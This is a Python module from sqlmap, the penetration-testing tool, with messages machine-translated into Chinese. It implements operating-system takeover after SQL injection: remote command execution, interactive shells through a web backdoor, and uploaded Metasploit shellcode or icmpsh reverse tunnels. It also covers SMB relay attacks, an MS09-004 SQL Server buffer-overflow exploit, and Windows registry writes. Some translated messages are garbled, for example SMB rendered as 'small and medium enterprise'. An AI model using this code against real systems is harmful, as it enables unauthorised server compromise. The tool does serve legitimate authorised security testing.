#!/usr/bin/env python

"""
Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

import os

from lib.core.common import Backend
from lib.core.common import getSafeExString
from lib.core.common import isDigit
from lib.core.common import isStackingAvailable
from lib.core.common import openFile
from lib.core.common import readInput
from lib.core.common import runningAsAdmin
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.enums import DBMS
from lib.core.enums import OS
from lib.core.exception import SqlmapFilePathException
from lib.core.exception import SqlmapMissingDependence
from lib.core.exception import SqlmapMissingMandatoryOptionException
from lib.core.exception import SqlmapMissingPrivileges
from lib.core.exception import SqlmapNotVulnerableException
from lib.core.exception import SqlmapSystemException
from lib.core.exception import SqlmapUndefinedMethod
from lib.core.exception import SqlmapUnsupportedDBMSException
from lib.takeover.abstraction import Abstraction
from lib.takeover.icmpsh import ICMPsh
from lib.takeover.metasploit import Metasploit
from lib.takeover.registry import Registry

class Takeover(Abstraction, Metasploit, ICMPsh, Registry):
    """
    This class defines generic OS takeover functionalities for plugins.
    """

    def __init__(self):
        self.cmdTblName = ("%soutput" % conf.tablePrefix)
        self.tblField = "data"

        Abstraction.__init__(self)

    def osCmd(self):
        if isStackingAvailable() or conf.direct:
            web = False
        elif not isStackingAvailable() and Backend.isDbms(DBMS.MYSQL):
            infoMsg = '将使用网络后门来执行命令'
            logger.info(infoMsg)

            web = True
        else:
            errMsg = '无法通过以下方式执行操作系统命令 '
            errMsg += '后端数据库管理系统'
            raise SqlmapNotVulnerableException(errMsg)

        self.getRemoteTempPath()
        self.initEnv(web=web)

        if not web or (web and self.webBackdoorUrl is not None):
            self.runCmd(conf.osCmd)

        if not conf.osShell and not conf.osPwn and not conf.cleanup:
            self.cleanup(web=web)

    def osShell(self):
        if isStackingAvailable() or conf.direct:
            web = False
        elif not isStackingAvailable() and Backend.isDbms(DBMS.MYSQL):
            infoMsg = '将使用网络后门作为命令提示符'
            logger.info(infoMsg)

            web = True
        else:
            errMsg = '无法提示交互操作 '
            errMsg += '通过后端数据库管理系统 的系统 shell 因为 '
            errMsg += '不支持堆叠查询 SQL 注入'
            raise SqlmapNotVulnerableException(errMsg)

        self.getRemoteTempPath()

        try:
            self.initEnv(web=web)
        except SqlmapFilePathException:
            if not web and not conf.direct:
                infoMsg = '回到网络后门方法...'
                logger.info(infoMsg)

                web = True
                kb.udfFail = True

                self.initEnv(web=web)
            else:
                raise

        if not web or (web and self.webBackdoorUrl is not None):
            self.shell()

        if not conf.osPwn and not conf.cleanup:
            self.cleanup(web=web)

    def osPwn(self):
        goUdf = False
        fallbackToWeb = False
        setupSuccess = False

        self.checkDbmsOs()

        if Backend.isOs(OS.WINDOWS):
            msg = '你想如何建立隧道？'
            msg += '\n[1] TCP：Metasploit框架（默认）'
            msg += '\n[2] ICMP：icmpsh - ICMP 隧道'

            while True:
                tunnel = readInput(msg, default='1')

                if isDigit(tunnel) and int(tunnel) in (1, 2):
                    tunnel = int(tunnel)
                    break

                else:
                    warnMsg = '无效值，有效值为“1”和“2”'
                    logger.warning(warnMsg)
        else:
            tunnel = 1

            debugMsg = '隧道只能通过 TCP 建立，当 '
            debugMsg += '后端数据库管理系统 不是 Windows'
            logger.debug(debugMsg)

        if tunnel == 2:
            isAdmin = runningAsAdmin()

            if not isAdmin:
                errMsg = '您需要以管理员身份运行 sqlmap '
                errMsg += '如果您想建立带外 ICMP '
                errMsg += '隧道，因为 icmpsh 使用原始套接字 '
                errMsg += '嗅探和制作 ICMP 数据包'
                raise SqlmapMissingPrivileges(errMsg)

            try:
                __import__("impacket")
            except ImportError:
                errMsg = "sqlmap需要'python-impacket'第三方库 "
                errMsg += '为了运行 icmpsh master。您可以在 '
                errMsg += "https://github.com/SecureAuthCorp/impacket"
                raise SqlmapMissingDependence(errMsg)

            filename = "/proc/sys/net/ipv4/icmp_echo_ignore_all"

            if os.path.exists(filename):
                try:
                    with openFile(filename, "wb") as f:
                        f.write("1")
                except IOError as ex:
                    errMsg = '文件打开/写入错误 '
                    errMsg += '对于文件名“%s”（“%s”）' % (filename, getSafeExString(ex))
                    raise SqlmapSystemException(errMsg)
            else:
                errMsg = '您需要禁用您的计算机的 ICMP 回复 '
                errMsg += '全系统范围内。例如在 Linux/Unix 上运行：\n'
                errMsg += "# sysctl -w net.ipv4.icmp_echo_ignore_all=1\n"
                errMsg += '如果您错过了这样做，您将收到 '
                errMsg += '来自数据库服务器的信息及其 '
                errMsg += '不太可能收到您发送的命令'
                logger.error(errMsg)

            if Backend.getIdentifiedDbms() in (DBMS.MYSQL, DBMS.PGSQL):
                self.sysUdfs.pop("sys_bineval")

        self.getRemoteTempPath()

        if isStackingAvailable() or conf.direct:
            web = False

            self.initEnv(web=web)

            if tunnel == 1:
                if Backend.getIdentifiedDbms() in (DBMS.MYSQL, DBMS.PGSQL):
                    msg = '你想如何执行 Metasploit shellcode '
                    msg += '后台数据库底层操作系统上？'
                    msg += "\n[1] 通过 UDF 'sys_bineval' （内存方式，反取证，默认）"
                    msg += '\n[2] 通过“shellcodeexec”（文件系统方式，64位系统首选）'

                    while True:
                        choice = readInput(msg, default='1')

                        if isDigit(choice) and int(choice) in (1, 2):
                            choice = int(choice)
                            break

                        else:
                            warnMsg = '无效值，有效值为“1”和“2”'
                            logger.warning(warnMsg)

                    if choice == 1:
                        goUdf = True

                if goUdf:
                    exitfunc = "thread"
                    setupSuccess = True
                else:
                    exitfunc = "process"

                self.createMsfShellcode(exitfunc=exitfunc, format="raw", extra="BufferRegister=EAX", encode="x86/alpha_mixed")

                if not goUdf:
                    setupSuccess = self.uploadShellcodeexec(web=web)

                    if setupSuccess is not True:
                        if Backend.isDbms(DBMS.MYSQL):
                            fallbackToWeb = True
                        else:
                            msg = '无法安装操作系统接管'
                            raise SqlmapFilePathException(msg)

                if Backend.isOs(OS.WINDOWS) and Backend.isDbms(DBMS.MYSQL) and conf.privEsc:
                    debugMsg = '默认情况下，Windows 上的 MySQL 作为 SYSTEM 运行 '
                    debugMsg += '用户，无需权限升级'
                    logger.debug(debugMsg)

            elif tunnel == 2:
                setupSuccess = self.uploadIcmpshSlave(web=web)

                if setupSuccess is not True:
                    if Backend.isDbms(DBMS.MYSQL):
                        fallbackToWeb = True
                    else:
                        msg = '无法安装操作系统接管'
                        raise SqlmapFilePathException(msg)

        if not setupSuccess and Backend.isDbms(DBMS.MYSQL) and not conf.direct and (not isStackingAvailable() or fallbackToWeb):
            web = True

            if fallbackToWeb:
                infoMsg = '回退到网络后门来建立隧道'
            else:
                infoMsg = '将使用网络后门来建立隧道'
            logger.info(infoMsg)

            self.initEnv(web=web, forceInit=fallbackToWeb)

            if self.webBackdoorUrl:
                if not Backend.isOs(OS.WINDOWS) and conf.privEsc:
                    # 如果后端数据库管理系统底层操作，则取消设置--priv-esc
                    # 系统不是Windows
                    conf.privEsc = False

                    warnMsg = 'sqlmap不实现任何操作系统 '
                    warnMsg += '用户权限提升技术 '
                    warnMsg += '后端数据库管理系统底层系统不是Windows'
                    logger.warning(warnMsg)

                if tunnel == 1:
                    self.createMsfShellcode(exitfunc="process", format="raw", extra="BufferRegister=EAX", encode="x86/alpha_mixed")
                    setupSuccess = self.uploadShellcodeexec(web=web)

                    if setupSuccess is not True:
                        msg = '无法安装操作系统接管'
                        raise SqlmapFilePathException(msg)

                elif tunnel == 2:
                    setupSuccess = self.uploadIcmpshSlave(web=web)

                    if setupSuccess is not True:
                        msg = '无法安装操作系统接管'
                        raise SqlmapFilePathException(msg)

        if setupSuccess:
            if tunnel == 1:
                self.pwn(goUdf)
            elif tunnel == 2:
                self.icmpPwn()
        else:
            errMsg = '无法提示带外会话'
            raise SqlmapNotVulnerableException(errMsg)

        if not conf.cleanup:
            self.cleanup(web=web)

    def osSmb(self):
        self.checkDbmsOs()

        if not Backend.isOs(OS.WINDOWS):
            errMsg = '后端数据库管理系统底层操作系统是 '
            errMsg += '不是 Windows：无法执行 SMB '
            errMsg += '中继攻击'
            raise SqlmapUnsupportedDBMSException(errMsg)

        if not isStackingAvailable() and not conf.direct:
            if Backend.getIdentifiedDbms() in (DBMS.PGSQL, DBMS.MSSQL):
                errMsg = '在此后端数据库管理系统 上，只能 '
                errMsg += '如果堆叠则执行 SMB 中继攻击 '
                errMsg += '支持查询'
                raise SqlmapUnsupportedDBMSException(errMsg)

            elif Backend.isDbms(DBMS.MYSQL):
                debugMsg = '由于不支持堆叠查询， '
                debugMsg += 'sqlmap 将执行 SMB 中继 '
                debugMsg += '通过推理盲 SQL 注入进行攻击'
                logger.debug(debugMsg)

        printWarn = True
        warnMsg = '这次攻击不太可能成功 '

        if Backend.isDbms(DBMS.MYSQL):
            warnMsg += '因为默认情况下 Windows 上的 MySQL 运行为 '
            warnMsg += '本地系统不是真正的用户，但它是 '
            warnMsg += '连接时不发送 NTLM 会话哈希 '
            warnMsg += '中小企业服务'

        elif Backend.isDbms(DBMS.PGSQL):
            warnMsg += '因为默认情况下 PostgreSQL 在 Windows 上运行 '
            warnMsg += '作为 postgres 用户，它是的真实用户 '
            warnMsg += '系统内，但不在管理员组内'

        elif Backend.isDbms(DBMS.MSSQL) and Backend.isVersionWithin(("2005", "2008")):
            warnMsg += '因为经常 Microsoft SQL Server %s ' % Backend.getVersion()
            warnMsg += '作为网络服务运行，它不是真正的用户， '
            warnMsg += '当以下情况时，它不会发送 NTLM 会话哈希： '
            warnMsg += '连接到 SMB 服务'

        else:
            printWarn = False

        if printWarn:
            logger.warning(warnMsg)

        self.smb()

    def osBof(self):
        if not isStackingAvailable() and not conf.direct:
            return

        if not Backend.isDbms(DBMS.MSSQL) or not Backend.isVersionWithin(("2000", "2005")):
            errMsg = '后端数据库管理系统 必须是 Microsoft SQL Server '
            errMsg += '2000年或2005年能够利用基于堆的 '
            errMsg += '“sp_replwritetovarbin”中的缓冲区溢出 '
            errMsg += '存储过程（MS09-004）'
            raise SqlmapUnsupportedDBMSException(errMsg)

        infoMsg = '将利用 Microsoft SQL Server %s ' % Backend.getVersion()
        infoMsg += "'sp_replwritetovarbin' 基于堆的存储过程 "
        infoMsg += '缓冲区溢出 (MS09-004)'
        logger.info(infoMsg)

        msg = '这种技术很可能会 DoS DBMS 进程，你是吗？ '
        msg += '确定要携带此漏洞吗？ [是/否] '

        if readInput(msg, default='N', boolean=True):
            self.initEnv(mandatory=False, detailed=True)
            self.getRemoteTempPath()
            self.createMsfShellcode(exitfunc="seh", format="raw", extra="-b 27", encode=True)
            self.bof()

    def uncPathRequest(self):
        errMsg = '必须定义“uncPathRequest”方法 '
        errMsg += '进入特定的 DBMS 插件'
        raise SqlmapUndefinedMethod(errMsg)

    def _regInit(self):
        if not isStackingAvailable() and not conf.direct:
            return

        self.checkDbmsOs()

        if not Backend.isOs(OS.WINDOWS):
            errMsg = '后端数据库管理系统底层操作系统是 '
            errMsg += '不是Windows'
            raise SqlmapUnsupportedDBMSException(errMsg)

        self.initEnv()
        self.getRemoteTempPath()

    def regRead(self):
        self._regInit()

        if not conf.regKey:
            default = "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion"
            msg = '您想读取哪个注册表项？ [%s] ' % default
            regKey = readInput(msg, default=default)
        else:
            regKey = conf.regKey

        if not conf.regVal:
            default = "ProductName"
            msg = '您想读取哪个注册表项值？ [%s] ' % default
            regVal = readInput(msg, default=default)
        else:
            regVal = conf.regVal

        infoMsg = '读取 Windows 注册表路径“%s\\%s” ' % (regKey, regVal)
        logger.info(infoMsg)

        return self.readRegKey(regKey, regVal, True)

    def regAdd(self):
        self._regInit()

        errMsg = '缺少强制选项'

        if not conf.regKey:
            msg = '您想写入哪个注册表项？ '
            regKey = readInput(msg)

            if not regKey:
                raise SqlmapMissingMandatoryOptionException(errMsg)
        else:
            regKey = conf.regKey

        if not conf.regVal:
            msg = '您要写入哪个注册表项值？ '
            regVal = readInput(msg)

            if not regVal:
                raise SqlmapMissingMandatoryOptionException(errMsg)
        else:
            regVal = conf.regVal

        if not conf.regData:
            msg = '您要写入哪个注册表键值数据？ '
            regData = readInput(msg)

            if not regData:
                raise SqlmapMissingMandatoryOptionException(errMsg)
        else:
            regData = conf.regData

        if not conf.regType:
            default = "REG_SZ"
            msg = '它是哪种注册表项值数据类型？ '
            msg += "[%s] " % default
            regType = readInput(msg, default=default)
        else:
            regType = conf.regType

        infoMsg = '添加 Windows 注册表路径“%s\\%s” ' % (regKey, regVal)
        infoMsg += '数据为“%s”。 ' % regData
        infoMsg += '仅当用户运行数据库时这才有效 '
        infoMsg += '进程具有修改 Windows 注册表的权限。'
        logger.info(infoMsg)

        self.addRegKey(regKey, regVal, regType, regData)

    def regDel(self):
        self._regInit()

        errMsg = '缺少强制选项'

        if not conf.regKey:
            msg = '您要删除哪个注册表项？ '
            regKey = readInput(msg)

            if not regKey:
                raise SqlmapMissingMandatoryOptionException(errMsg)
        else:
            regKey = conf.regKey

        if not conf.regVal:
            msg = '您要删除哪个注册表项值？ '
            regVal = readInput(msg)

            if not regVal:
                raise SqlmapMissingMandatoryOptionException(errMsg)
        else:
            regVal = conf.regVal

        message = '您确定要删除 Windows '
        message += "注册表路径'%s\\%s？ [是/否] " % (regKey, regVal)

        if not readInput(message, default='N', boolean=True):
            return

        infoMsg = '删除 Windows 注册表路径“%s\\%s”。 ' % (regKey, regVal)
        infoMsg += '仅当用户运行数据库时这才有效 '
        infoMsg += '进程具有修改 Windows 注册表的权限。'
        logger.info(infoMsg)

        self.delRegKey(regKey, regVal)
